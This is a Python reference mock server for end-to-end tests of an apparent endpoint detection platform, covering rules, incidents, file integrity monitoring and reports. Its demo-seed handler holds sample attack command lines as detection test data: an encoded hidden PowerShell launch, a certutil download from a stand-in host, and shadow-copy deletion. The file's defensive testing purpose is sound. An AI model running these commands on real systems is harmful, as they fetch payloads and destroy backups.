"""In-process Reference / Mock HTTP server implementing Agni REST API contract.

Allows opaque-box E2E tests to run standalone or when validating specification compliance.
"""

from __future__ import annotations

import csv
import hashlib
import io
import json
import os
import re
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any

from tests.e2e.harness.fixtures import DEFAULT_RULES, now_iso


def get_field_by_path(data: dict[str, Any], path: str) -> Any:
    """Retrieve nested dict field using dot notation (e.g. 'actor.cmdline')."""
    parts = path.split(".")
    curr: Any = data
    for part in parts:
        if isinstance(curr, dict) and part in curr:
            curr = curr[part]
        else:
            return None
    return curr


def evaluate_condition(condition: dict[str, Any], event: dict[str, Any]) -> bool:
    """Evaluate a single rule AST condition or boolean composition ('and', 'or')."""
    if "and" in condition:
        return all(evaluate_condition(sub, event) for sub in condition["and"])
    if "or" in condition:
        return any(evaluate_condition(sub, event) for sub in condition["or"])

    field = condition.get("field")
    operator = condition.get("operator")
    expected_value = condition.get("value")

    if not field or not operator:
        return False

    actual_value = get_field_by_path(event, field)
    if actual_value is None:
        return False

    if operator == "equals":
        return actual_value == expected_value
    elif operator == "not_equals":
        return actual_value != expected_value
    elif operator == "in":
        if isinstance(expected_value, list):
            return actual_value in expected_value
        return False
    elif operator == "regex":
        try:
            return bool(re.search(str(expected_value), str(actual_value)))
        except Exception:
            return False
    elif operator == "contains":
        return str(expected_value).lower() in str(actual_value).lower()
    return False


class AgniReferenceState:
    """In-memory state machine implementing Agni platform business logic."""

    def __init__(self) -> None:
        self.lock = threading.RLock()
        self.reset()

    def reset(self) -> None:
        with getattr(self, "lock", threading.RLock()):
            self.rules: dict[str, dict[str, Any]] = {
                r["id"]: dict(r) for r in DEFAULT_RULES
            }
            self.events: list[dict[str, Any]] = []
            self.incidents: dict[str, dict[str, Any]] = {}
            self.alerts: list[dict[str, Any]] = []
            self.fim_baselines: dict[str, dict[str, Any]] = {}
            self.fim_baseline_entries: dict[str, dict[str, dict[str, Any]]] = {}  # baseline_id -> {path -> entry}
            self.fim_changes: list[dict[str, Any]] = []
            self.audit_logs: list[dict[str, Any]] = []
            self.persistence_entries: list[dict[str, Any]] = [
                {
                    "id": "pers-001",
                    "name": "SecurityHealthSystray",
                    "category": "RegistryRun",
                    "path": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
                    "command": r"C:\Windows\System32\SecurityHealthSystray.exe",
                    "user_scope": "System",
                    "suspicious_indicator": False,
                }
            ]
            self.settings: dict[str, Any] = {
                "polling_interval_sec": 5,
                "retention_days": 30,
                "fim_max_file_size_mb": 100,
                "ai_enabled": False,
                "ai_provider": "ollama",
                "ai_endpoint": "http://127.0.0.1:11434",
            }
            self.network_config: dict[str, Any] = {
                "allowed_cidrs": ["192.168.0.0/16", "10.0.0.0/8", "172.16.0.0/12"],
                "passive_discovery_enabled": True,
            }
            self.network_interfaces: list[dict[str, Any]] = [
                {
                    "name": "Loopback Pseudo-Interface 1",
                    "ip_address": "127.0.0.1",
                    "mac_address": "00:00:00:00:00:00",
                    "status": "UP",
                    "is_loopback": True,
                    "netmask": "255.0.0.0",
                },
                {
                    "name": "Ethernet0",
                    "ip_address": "192.168.1.100",
                    "mac_address": "00:1A:2B:3C:4D:5E",
                    "status": "UP",
                    "is_loopback": False,
                    "netmask": "255.255.255.0",
                },
            ]
            self.network_devices: list[dict[str, Any]] = [
                {
                    "ip_address": "192.168.1.1",
                    "mac_address": "00:11:22:33:44:55",
                    "hostname": "gateway.local",
                    "vendor": "Cisco Systems",
                    "first_seen": "2026-10-28T00:00:00Z",
                    "last_seen": now_iso(),
                    "is_sample": False,
                }
            ]
            self.active_sockets: list[dict[str, Any]] = [
                {
                    "protocol": "TCP",
                    "local_address": "127.0.0.1",
                    "local_port": 8000,
                    "remote_address": "0.0.0.0",
                    "remote_port": 0,
                    "status": "LISTEN",
                    "pid": 1024,
                    "process_name": "agni.exe",
                }
            ]

    def record_audit(self, action: str, target_resource: str, details: dict[str, Any] | None = None, status: str = "SUCCESS") -> None:
        log_entry = {
            "id": f"audit-{len(self.audit_logs) + 1}",
            "timestamp": now_iso(),
            "action": action,
            "actor": "local_analyst",
            "target_resource": target_resource,
            "status": status,
            "details": details or {},
        }
        self.audit_logs.append(log_entry)

    def ingest_event(self, event: dict[str, Any]) -> tuple[dict[str, Any], list[dict[str, Any]]]:
        """Process event, match rules, correlate alerts into incidents."""
        with self.lock:
            self.events.append(event)
            new_incidents: list[dict[str, Any]] = []

            for rule_id, rule in self.rules.items():
                if not rule.get("enabled", True):
                    continue

                if evaluate_condition(rule["match_conditions"], event):
                    # Create Alert
                    alert_id = f"alert-{len(self.alerts) + 1}"
                    alert = {
                        "id": alert_id,
                        "rule_id": rule_id,
                        "timestamp": event.get("timestamp", now_iso()),
                        "severity": rule["severity"],
                        "explanation": rule["explanation"],
                        "triggering_event_id": event.get("event_id"),
                        "match_details": {"rule_name": rule["name"]},
                    }
                    self.alerts.append(alert)

                    # Determine Entity Key for deduplication & grouping
                    actor_pid = get_field_by_path(event, "actor.pid")
                    target_id = get_field_by_path(event, "target.identifier")
                    entity_key = f"{rule_id}:{actor_pid or target_id or 'host'}"

                    # Priority mapping
                    priority_map = {
                        "Critical": "P1_Critical",
                        "High": "P2_High",
                        "Medium": "P3_Medium",
                        "Low": "P4_Low",
                        "Informational": "P4_Low",
                    }
                    priority = priority_map.get(rule["severity"], "P3_Medium")

                    # Check for open incident with same entity key
                    existing = next(
                        (inc for inc in self.incidents.values() if inc["entity_key"] == entity_key and inc["status"] in ("New", "Triaged", "In Progress")),
                        None,
                    )
                    if existing:
                        existing["event_count"] += 1
                        existing["last_seen"] = now_iso()
                        existing.setdefault("alerts", []).append(alert)
                    else:
                        inc_id = f"INC-{len(self.incidents) + 1:04d}"
                        new_inc = {
                            "id": inc_id,
                            "title": rule["name"],
                            "rule_id": rule_id,
                            "severity": rule["severity"],
                            "priority": priority,
                            "status": "New",
                            "entity_key": entity_key,
                            "first_seen": event.get("timestamp", now_iso()),
                            "last_seen": event.get("timestamp", now_iso()),
                            "event_count": 1,
                            "summary": rule["explanation"],
                            "mitre_attack": rule.get("mitre_attack"),
                            "assigned_analyst": None,
                            "is_sample": bool(event.get("is_sample", False)),
                            "alerts": [alert],
                            "notes": [],
                        }
                        self.incidents[inc_id] = new_inc
                        new_incidents.append(new_inc)

            return event, new_incidents


# Global state singleton for the reference server
STATE = AgniReferenceState()


class AgniRequestHandler(BaseHTTPRequestHandler):
    """HTTP Request Handler implementing Agni REST endpoints."""

    server_version = "AgniReferenceServer/1.0.0"

    def log_message(self, format: str, *args: Any) -> None:
        # Suppress noisy standard HTTP access logs during test runs
        pass

    def send_json(self, status_code: int, data: Any, envelope: bool = True) -> None:
        response_obj = {
            "status": "success" if 200 <= status_code < 300 else "error",
            "data": data,
            "timestamp": now_iso(),
        } if envelope and isinstance(data, (dict, list)) and not (isinstance(data, dict) and "status" in data) else data

        body = json.dumps(response_obj).encode("utf-8")
        self.send_response(status_code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "http://127.0.0.1:5173")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, PUT, PATCH, DELETE, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        self.end_headers()
        self.wfile.write(body)

    def send_error_json(self, status_code: int, detail: str, error_code: str = "ERROR") -> None:
        err_obj = {
            "detail": detail,
            "error_code": error_code,
            "timestamp": now_iso(),
        }
        body = json.dumps(err_obj).encode("utf-8")
        self.send_response(status_code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def read_json_body(self) -> Any | None:
        content_length = int(self.headers.get("Content-Length", 0))
        if content_length <= 0:
            return None
        body = self.rfile.read(content_length)
        try:
            return json.loads(body.decode("utf-8"))
        except Exception:
            return None

    def do_OPTIONS(self) -> None:
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "http://127.0.0.1:5173")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, PUT, PATCH, DELETE, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        self.end_headers()

    def do_GET(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)

        # 1. Health & Diagnostics
        if path == "/api/v1/health":
            self.send_json(200, {
                "status": "ok",
                "version": "1.0.0",
                "platform": "Windows" if os.name == "nt" else "Linux",
                "mode": "live",
            })
            return

        if path == "/api/v1/sensor/status":
            self.send_json(200, {
                "status": "healthy",
                "latency_ms": 12.4,
                "error_count": 0,
                "cpu_percent": 0.5,
                "memory_rss_mb": 45.2,
            })
            return

        if path == "/api/v1/diagnostics":
            self.send_json(200, {
                "hostname": "Agni-TestHost",
                "os": "Windows" if os.name == "nt" else "Linux",
                "os_version": "10.0.19045",
                "python_version": "3.13.15",
                "database_status": "connected",
                "storage_free_gb": 128.5,
            })
            return

        if path == "/api/v1/telemetry/overview":
            with STATE.lock:
                active_inc = len([i for i in STATE.incidents.values() if i["status"] != "Resolved"])
                self.send_json(200, {
                    "threat_score": 15 if active_inc == 0 else min(100, active_inc * 25),
                    "active_incidents_count": active_inc,
                    "events_24h_count": len(STATE.events),
                    "monitored_baselines_count": len(STATE.fim_baselines),
                })
            return

        # 2. Processes
        if path == "/api/v1/processes":
            mock_processes = [
                {
                    "pid": 1024,
                    "ppid": 400,
                    "name": "explorer.exe",
                    "path": r"C:\Windows\explorer.exe",
                    "cmdline": [r"C:\Windows\explorer.exe"],
                    "cpu_percent": 0.2,
                    "memory_rss_mb": 55.4,
                    "user": "TestHost\\TestUser",
                    "status": "running",
                },
                {
                    "pid": 2048,
                    "ppid": 1024,
                    "name": "powershell.exe",
                    "path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "cmdline": ["powershell.exe", "-NoExit"],
                    "cpu_percent": 0.1,
                    "memory_rss_mb": 35.8,
                    "user": "TestHost\\TestUser",
                    "status": "running",
                },
            ]
            self.send_json(200, mock_processes)
            return

        if path.startswith("/api/v1/processes/"):
            pid_str = path.split("/")[-1]
            try:
                pid = int(pid_str)
                if pid == 1024:
                    self.send_json(200, {
                        "pid": 1024,
                        "name": "explorer.exe",
                        "path": r"C:\Windows\explorer.exe",
                        "ppid": 400,
                        "cpu_percent": 0.2,
                        "memory_rss_mb": 55.4,
                    })
                else:
                    self.send_error_json(404, f"Process with PID {pid} not found", "NOT_FOUND")
            except ValueError:
                self.send_error_json(400, "Invalid PID", "INVALID_ARGUMENT")
            return

        # 3. FIM Baselines & Changes
        if path == "/api/v1/fim/baselines":
            with STATE.lock:
                self.send_json(200, list(STATE.fim_baselines.values()))
            return

        if path == "/api/v1/fim/changes":
            with STATE.lock:
                self.send_json(200, STATE.fim_changes)
            return

        # 4. Persistence
        if path == "/api/v1/persistence/entries":
            with STATE.lock:
                self.send_json(200, STATE.persistence_entries)
            return

        # 5. Network
        if path == "/api/v1/network/interfaces":
            with STATE.lock:
                self.send_json(200, STATE.network_interfaces)
            return

        if path == "/api/v1/network/connections":
            with STATE.lock:
                self.send_json(200, STATE.active_sockets)
            return

        if path == "/api/v1/network/devices":
            include_sample = query.get("include_sample", ["false"])[0].lower() == "true"
            with STATE.lock:
                devs = [d for d in STATE.network_devices if include_sample or not d.get("is_sample", False)]
                self.send_json(200, devs)
            return

        if path == "/api/v1/network/config":
            with STATE.lock:
                self.send_json(200, STATE.network_config)
            return

        # 6. Events
        if path == "/api/v1/events":
            include_sample = query.get("include_sample", ["false"])[0].lower() == "true"
            category = query.get("category", [None])[0]
            severity = query.get("severity", [None])[0]

            with STATE.lock:
                evs = [
                    e for e in STATE.events
                    if (include_sample or not e.get("is_sample", False))
                    and (category is None or e.get("category") == category)
                    and (severity is None or e.get("severity") == severity)
                ]
                self.send_json(200, evs)
            return

        # 7. Rules
        if path == "/api/v1/rules":
            category = query.get("category", [None])[0]
            enabled_filter = query.get("enabled", [None])[0]

            with STATE.lock:
                rule_list = list(STATE.rules.values())
                if category:
                    rule_list = [r for r in rule_list if r.get("category") == category]
                if enabled_filter is not None:
                    is_en = enabled_filter.lower() == "true"
                    rule_list = [r for r in rule_list if r.get("enabled") == is_en]
                self.send_json(200, rule_list)
            return

        if path.startswith("/api/v1/rules/"):
            rule_id = path.split("/")[-1]
            with STATE.lock:
                if rule_id in STATE.rules:
                    self.send_json(200, STATE.rules[rule_id])
                else:
                    self.send_error_json(404, f"Rule {rule_id} not found", "RULE_NOT_FOUND")
            return

        # 8. Incidents
        if path == "/api/v1/incidents":
            include_sample = query.get("include_sample", ["false"])[0].lower() == "true"
            status = query.get("status", [None])[0]
            severity = query.get("severity", [None])[0]

            with STATE.lock:
                incs = [
                    i for i in STATE.incidents.values()
                    if (include_sample or not i.get("is_sample", False))
                    and (status is None or i.get("status") == status)
                    and (severity is None or i.get("severity") == severity)
                ]
                self.send_json(200, incs)
            return

        if path.startswith("/api/v1/incidents/"):
            inc_id = path.split("/")[-1]
            with STATE.lock:
                if inc_id in STATE.incidents:
                    self.send_json(200, STATE.incidents[inc_id])
                else:
                    self.send_error_json(404, f"Incident {inc_id} not found", "INCIDENT_NOT_FOUND")
            return

        # 9. Demo Status
        if path == "/api/v1/demo/status":
            with STATE.lock:
                sample_evs = [e for e in STATE.events if e.get("is_sample", False)]
                sample_incs = [i for i in STATE.incidents.values() if i.get("is_sample", False)]
                self.send_json(200, {
                    "has_sample_data": len(sample_evs) > 0 or len(sample_incs) > 0,
                    "sample_events_count": len(sample_evs),
                    "sample_incidents_count": len(sample_incs),
                })
            return

        # 10. Settings & Audit
        if path == "/api/v1/settings":
            with STATE.lock:
                self.send_json(200, STATE.settings)
            return

        if path == "/api/v1/audit/logs":
            with STATE.lock:
                self.send_json(200, STATE.audit_logs)
            return

        self.send_error_json(404, f"Endpoint {path} not found", "NOT_FOUND")

    def do_POST(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        body = self.read_json_body() or {}

        # 1. Ingest Event
        if path == "/api/v1/events":
            if not isinstance(body, dict) or "category" not in body or "severity" not in body:
                self.send_error_json(422, "Missing required event fields (category, severity)", "VALIDATION_ERROR")
                return

            valid_severities = {"Informational", "Low", "Medium", "High", "Critical"}
            if body["severity"] not in valid_severities:
                self.send_error_json(422, f"Invalid severity level: {body['severity']}", "VALIDATION_ERROR")
                return

            event, new_incidents = STATE.ingest_event(body)
            self.send_json(201, {
                "event_id": event.get("event_id"),
                "status": "ingested",
                "triggered_incidents_count": len(new_incidents),
            })
            return

        # 2. Create FIM Baseline
        if path == "/api/v1/fim/baselines":
            target_path = body.get("target_path", "")
            # Security: Path Traversal Prevention
            if ".." in target_path or "\0" in target_path:
                self.send_error_json(400, "Path traversal detected in target_path", "SECURITY_VIOLATION")
                return

            if not os.path.exists(target_path):
                self.send_error_json(400, f"Path does not exist: {target_path}", "PATH_NOT_FOUND")
                return

            baseline_id = f"baseline-{len(STATE.fim_baselines) + 1}"
            max_size = body.get("max_file_size_bytes", 104857600)
            file_entries = {}

            # Scan files on disk
            try:
                for root, _, files in os.walk(target_path):
                    for filename in files:
                        full_p = os.path.join(root, filename)
                        try:
                            st = os.stat(full_p)
                            if st.st_size <= max_size:
                                hashr = hashlib.sha256()
                                with open(full_p, "rb") as f:
                                    while chunk := f.read(65536):
                                        hashr.update(chunk)
                                h_val = hashr.hexdigest()
                            else:
                                h_val = "EXCEEDS_SIZE_LIMIT"
                            file_entries[full_p] = {
                                "file_path": full_p,
                                "sha256": h_val,
                                "size": st.st_size,
                            }
                        except Exception:
                            continue
            except Exception as e:
                self.send_error_json(500, f"Error scanning directory: {e}")
                return

            new_baseline = {
                "id": baseline_id,
                "name": body.get("name", "Baseline"),
                "target_path": target_path,
                "recursive": body.get("recursive", True),
                "total_files": len(file_entries),
                "status": "Active",
                "created_at": now_iso(),
            }
            with STATE.lock:
                STATE.fim_baselines[baseline_id] = new_baseline
                STATE.fim_baseline_entries[baseline_id] = file_entries
                STATE.record_audit("FIM_BASELINE_CREATE", f"baseline:{baseline_id}", {"target_path": target_path})

            self.send_json(201, new_baseline)
            return

        # 3. Scan FIM
        if path == "/api/v1/fim/scan":
            baseline_id = body.get("baseline_id")
            detected_changes = []

            with STATE.lock:
                target_baselines = [baseline_id] if baseline_id else list(STATE.fim_baselines.keys())
                for b_id in target_baselines:
                    b_info = STATE.fim_baselines.get(b_id)
                    if not b_info:
                        continue
                    old_entries = STATE.fim_baseline_entries.get(b_id, {})
                    target_p = b_info["target_path"]

                    current_entries = {}
                    if os.path.exists(target_p):
                        for root, _, files in os.walk(target_p):
                            for filename in files:
                                full_p = os.path.join(root, filename)
                                try:
                                    hashr = hashlib.sha256()
                                    with open(full_p, "rb") as f:
                                        while chunk := f.read(65536):
                                            hashr.update(chunk)
                                    current_entries[full_p] = hashr.hexdigest()
                                except Exception:
                                    continue

                    # Created
                    for cp, chash in current_entries.items():
                        if cp not in old_entries:
                            ch_obj = {
                                "id": f"change-{len(STATE.fim_changes) + 1}",
                                "baseline_id": b_id,
                                "file_path": cp,
                                "change_type": "CREATED",
                                "previous_sha256": None,
                                "current_sha256": chash,
                                "detected_at": now_iso(),
                            }
                            STATE.fim_changes.append(ch_obj)
                            detected_changes.append(ch_obj)
                        elif old_entries[cp]["sha256"] != chash and chash != "EXCEEDS_SIZE_LIMIT":
                            ch_obj = {
                                "id": f"change-{len(STATE.fim_changes) + 1}",
                                "baseline_id": b_id,
                                "file_path": cp,
                                "change_type": "MODIFIED",
                                "previous_sha256": old_entries[cp]["sha256"],
                                "current_sha256": chash,
                                "detected_at": now_iso(),
                            }
                            STATE.fim_changes.append(ch_obj)
                            detected_changes.append(ch_obj)

                    # Deleted
                    for op, oinfo in old_entries.items():
                        if op not in current_entries:
                            ch_obj = {
                                "id": f"change-{len(STATE.fim_changes) + 1}",
                                "baseline_id": b_id,
                                "file_path": op,
                                "change_type": "DELETED",
                                "previous_sha256": oinfo["sha256"],
                                "current_sha256": None,
                                "detected_at": now_iso(),
                            }
                            STATE.fim_changes.append(ch_obj)
                            detected_changes.append(ch_obj)

            self.send_json(200, {
                "scanned_baselines": len(target_baselines),
                "changes_detected_count": len(detected_changes),
                "changes": detected_changes,
            })
            return

        # 4. Refresh Persistence
        if path == "/api/v1/persistence/scan":
            with STATE.lock:
                self.send_json(200, STATE.persistence_entries)
            return

        # 5. Create Rule
        if path == "/api/v1/rules":
            required_keys = {"id", "name", "severity", "match_conditions"}
            if not required_keys.issubset(body.keys()):
                self.send_error_json(422, "Missing required rule fields: id, name, severity, match_conditions", "VALIDATION_ERROR")
                return

            valid_sevs = {"Informational", "Low", "Medium", "High", "Critical"}
            if body["severity"] not in valid_sevs:
                self.send_error_json(422, f"Invalid severity: {body['severity']}", "VALIDATION_ERROR")
                return

            # Validate match condition operators and AST structure
            def validate_cond(cond: Any) -> str | None:
                if not isinstance(cond, dict):
                    return "Condition must be a dictionary"
                if "and" in cond:
                    for c in cond["and"]:
                        err = validate_cond(c)
                        if err:
                            return err
                    return None
                if "or" in cond:
                    for c in cond["or"]:
                        err = validate_cond(c)
                        if err:
                            return err
                    return None
                op = cond.get("operator")
                valid_ops = {"equals", "not_equals", "in", "regex", "contains"}
                if op not in valid_ops:
                    return f"Invalid operator: {op}"
                if op == "regex":
                    try:
                        re.compile(cond.get("value", ""))
                    except Exception as e:
                        return f"Invalid regex pattern: {e}"
                return None

            conds = body.get("match_conditions", {})
            err = validate_cond(conds)
            if err:
                self.send_error_json(422, err, "INVALID_CONDITION")
                return

            new_rule = dict(body)
            new_rule.setdefault("enabled", True)
            new_rule.setdefault("correlation_window", 0)
            new_rule.setdefault("threshold", 1)
            new_rule.setdefault("explanation", "Custom Rule")
            new_rule.setdefault("investigation_steps", [])

            with STATE.lock:
                STATE.rules[new_rule["id"]] = new_rule
                STATE.record_audit("RULE_CREATE", f"rule:{new_rule['id']}", {"rule_name": new_rule["name"]})

            self.send_json(201, new_rule)
            return

        # 6. Test Rule Dry-Run
        if path == "/api/v1/rules/test":
            rule_payload = body.get("rule", {})
            sample_event = body.get("sample_event", {})
            match_cond = rule_payload.get("match_conditions", {})
            matched = evaluate_condition(match_cond, sample_event)
            self.send_json(200, {
                "matched": matched,
                "explanation": rule_payload.get("explanation", ""),
            })
            return

        # 7. Add Incident Note
        if path.startswith("/api/v1/incidents/") and path.endswith("/notes"):
            inc_id = path.split("/")[-2]
            content = body.get("content", "")
            if not content:
                self.send_error_json(422, "Content is required for incident note", "VALIDATION_ERROR")
                return

            with STATE.lock:
                if inc_id not in STATE.incidents:
                    self.send_error_json(404, f"Incident {inc_id} not found", "NOT_FOUND")
                    return

                note_id = f"note-{len(STATE.incidents[inc_id]['notes']) + 1}"
                note = {
                    "id": note_id,
                    "author": "local_analyst",
                    "created_at": now_iso(),
                    "content": content,
                }
                STATE.incidents[inc_id]["notes"].append(note)
                STATE.record_audit("INCIDENT_NOTE_ADD", f"incident:{inc_id}", {"note_id": note_id})

            self.send_json(201, note)
            return

        # 8. Report Export
        if path == "/api/v1/reports/export":
            fmt = body.get("format", "json").lower()
            include_sample = bool(body.get("include_sample", False))

            with STATE.lock:
                inc_list = [
                    i for i in STATE.incidents.values()
                    if include_sample or not i.get("is_sample", False)
                ]

            if fmt == "json":
                out_bytes = json.dumps({"report_type": "incident_summary", "exported_at": now_iso(), "incidents": inc_list}, indent=2).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Disposition", 'attachment; filename="agni_report.json"')
                self.send_header("Content-Length", str(len(out_bytes)))
                self.end_headers()
                self.wfile.write(out_bytes)
                return

            elif fmt == "csv":
                output = io.StringIO()
                writer = csv.writer(output)
                writer.writerow([
                    "Incident ID", "Title", "Severity", "Priority", "Status",
                    "Rule ID", "MITRE ATT&CK", "Entity Key", "Event Count",
                    "First Seen", "Last Seen", "Is Sample"
                ])
                for i in inc_list:
                    writer.writerow([
                        i.get("id"), i.get("title"), i.get("severity"), i.get("priority"),
                        i.get("status"), i.get("rule_id"), i.get("mitre_attack", ""),
                        i.get("entity_key"), i.get("event_count"), i.get("first_seen"),
                        i.get("last_seen"), i.get("is_sample"),
                    ])
                out_bytes = output.getvalue().encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/csv")
                self.send_header("Content-Disposition", 'attachment; filename="agni_report.csv"')
                self.send_header("Content-Length", str(len(out_bytes)))
                self.end_headers()
                self.wfile.write(out_bytes)
                return

            elif fmt == "html":
                html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Agni Security Report</title>
  <style>
    body {{ background: #0a0f1d; color: #f1f5f9; font-family: sans-serif; padding: 24px; }}
    h1 {{ color: #00e5ff; display: flex; align-items: center; gap: 12px; }}
    .badge {{ padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }}
    .Critical {{ background: #ff3d71; color: white; }}
    .High {{ background: #ff708d; color: white; }}
    .Medium {{ background: #ffb300; color: black; }}
    table {{ width: 100%; border-collapse: collapse; margin-top: 16px; }}
    th, td {{ border: 1px solid #1e293b; padding: 10px; text-align: left; }}
    th {{ background: #0f172a; color: #94a3b8; }}
  </style>
</head>
<body>
  <h1>🔥 Agni (अग्नि) Threat Intelligence Report</h1>
  <p>Generated: {now_iso()} | Total Incidents: {len(inc_list)}</p>
  <table>
    <thead>
      <tr>
        <th>ID</th><th>Title</th><th>Severity</th><th>Status</th><th>Rule ID</th><th>Event Count</th>
      </tr>
    </thead>
    <tbody>
      {''.join(f"<tr><td>{i.get('id')}</td><td>{i.get('title')}</td><td><span class='badge {i.get('severity')}'>{i.get('severity')}</span></td><td>{i.get('status')}</td><td>{i.get('rule_id')}</td><td>{i.get('event_count')}</td></tr>" for i in inc_list)}
    </tbody>
  </table>
</body>
</html>"""
                out_bytes = html_content.encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Disposition", 'attachment; filename="agni_report.html"')
                self.send_header("Content-Length", str(len(out_bytes)))
                self.end_headers()
                self.wfile.write(out_bytes)
                return

            else:
                self.send_error_json(400, f"Unsupported export format: {fmt}. Supported formats: json, csv, html", "UNSUPPORTED_FORMAT")
                return

        # 9. Demo Data Seed & Clear
        if path == "/api/v1/demo/seed":
            from tests.e2e.harness.fixtures import (
                make_network_event,
                make_persistence_event,
                make_process_event,
            )
            # Simulated 6-stage Operation Ignis Vector
            ev1 = make_process_event("powershell.exe", "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", pid=4812, is_sample=True)
            ev2 = make_process_event("certutil.exe", "certutil.exe -urlcache -split -f http://bad.com/payload.exe", pid=5012, is_sample=True)
            ev3 = make_persistence_event(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCheck", is_sample=True)
            ev4 = make_network_event("198.51.100.44", 4444, pid=4812, is_sample=True)
            ev5 = make_process_event("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", pid=6120, is_sample=True)

            with STATE.lock:
                for ev in [ev1, ev2, ev3, ev4, ev5]:
                    STATE.ingest_event(ev)
                STATE.record_audit("DEMO_SEED", "demo:telemetry", {"events_injected": 5})

            self.send_json(200, {
                "status": "success",
                "message": "Demo APT attack scenario seeded successfully",
                "events_count": 5,
            })
            return

        if path == "/api/v1/demo/clear":
            with STATE.lock:
                STATE.events = [e for e in STATE.events if not e.get("is_sample", False)]
                STATE.incidents = {k: v for k, v in STATE.incidents.items() if not v.get("is_sample", False)}
                STATE.alerts = [a for a in STATE.alerts if not a.get("is_sample", False)]
                STATE.record_audit("DEMO_CLEAR", "demo:telemetry", {})

            self.send_json(200, {"status": "success", "message": "Demo data cleared"})
            return

        self.send_error_json(404, f"Endpoint {path} not found", "NOT_FOUND")

    def do_PATCH(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        body = self.read_json_body() or {}

        # Toggle Rule
        if path.startswith("/api/v1/rules/") and path.endswith("/toggle"):
            rule_id = path.split("/")[-2]
            with STATE.lock:
                if rule_id not in STATE.rules:
                    self.send_error_json(404, f"Rule {rule_id} not found", "RULE_NOT_FOUND")
                    return
                enabled_state = bool(body.get("enabled", True))
                STATE.rules[rule_id]["enabled"] = enabled_state
                STATE.record_audit("RULE_TOGGLE", f"rule:{rule_id}", {"enabled": enabled_state})
                self.send_json(200, STATE.rules[rule_id])
            return

        # Update Incident Status
        if path.startswith("/api/v1/incidents/") and path.endswith("/status"):
            inc_id = path.split("/")[-2]
            new_status = body.get("status")
            note = body.get("note")

            valid_statuses = {"New", "Triaged", "In Progress", "Resolved", "False Positive"}
            if new_status not in valid_statuses:
                self.send_error_json(422, f"Invalid incident status: {new_status}", "VALIDATION_ERROR")
                return

            with STATE.lock:
                if inc_id not in STATE.incidents:
                    self.send_error_json(404, f"Incident {inc_id} not found", "NOT_FOUND")
                    return

                inc = STATE.incidents[inc_id]
                old_status = inc["status"]
                inc["status"] = new_status
                if note:
                    inc["notes"].append({
                        "id": f"note-{len(inc['notes']) + 1}",
                        "author": "local_analyst",
                        "created_at": now_iso(),
                        "content": f"Status changed from {old_status} to {new_status}: {note}",
                    })
                STATE.record_audit("INCIDENT_STATUS_CHANGE", f"incident:{inc_id}", {"from": old_status, "to": new_status})
                self.send_json(200, inc)
            return

        self.send_error_json(404, f"Endpoint {path} not found", "NOT_FOUND")

    def do_PUT(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        body = self.read_json_body() or {}

        # Update Settings
        if path == "/api/v1/settings":
            with STATE.lock:
                STATE.settings.update(body)
                STATE.record_audit("SETTINGS_UPDATE", "system:settings", body)
                self.send_json(200, STATE.settings)
            return

        # Update Network Config
        if path == "/api/v1/network/config":
            with STATE.lock:
                STATE.network_config.update(body)
                STATE.record_audit("NETWORK_CONFIG_UPDATE", "network:config", body)
                self.send_json(200, STATE.network_config)
            return

        self.send_error_json(404, f"Endpoint {path} not found", "NOT_FOUND")

    def do_DELETE(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        # Delete FIM Baseline
        if path.startswith("/api/v1/fim/baselines/"):
            b_id = path.split("/")[-1]
            with STATE.lock:
                if b_id in STATE.fim_baselines:
                    del STATE.fim_baselines[b_id]
                    if b_id in STATE.fim_baseline_entries:
                        del STATE.fim_baseline_entries[b_id]
                    STATE.record_audit("FIM_BASELINE_DELETE", f"baseline:{b_id}", {})
                    self.send_json(200, {"status": "deleted", "id": b_id})
                else:
                    self.send_error_json(404, f"Baseline {b_id} not found", "NOT_FOUND")
            return

        self.send_error_json(404, f"Endpoint {path} not found", "NOT_FOUND")


class ReferenceServerManager:
    """Manages lifecycle of the reference HTTP server in a background daemon thread."""

    def __init__(self, host: str = "127.0.0.1", port: int = 0) -> None:
        self.host = host
        self.requested_port = port
        self.server: ThreadingHTTPServer | None = None
        self.thread: threading.Thread | None = None
        self.port: int = 0

    def start(self) -> str:
        """Start reference server and return the base API URL."""
        # Check if port is already taken or port=0 for ephemeral
        self.server = ThreadingHTTPServer((self.host, self.requested_port), AgniRequestHandler)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        # Give server time to bind
        time.sleep(0.1)
        return f"http://{self.host}:{self.port}/api/v1"

    def stop(self) -> None:
        """Stop server gracefully."""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.server = None
        if self.thread:
            self.thread.join(timeout=2.0)
            self.thread = None
